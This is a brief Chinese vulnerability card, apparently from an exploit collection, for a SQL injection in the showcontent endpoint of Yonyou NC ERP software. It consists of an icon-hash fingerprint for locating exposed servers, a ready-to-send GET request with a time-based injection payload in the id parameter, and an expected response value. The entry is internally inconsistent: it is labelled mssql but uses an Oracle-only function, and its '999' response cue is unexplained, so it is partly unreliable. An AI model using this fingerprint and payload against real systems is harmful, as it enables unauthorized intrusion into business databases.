# 用友NCshowcontentSQL注入漏洞-mssql

用友 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1085941792"`
- **请求**：`GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1`
- **响应特征**：999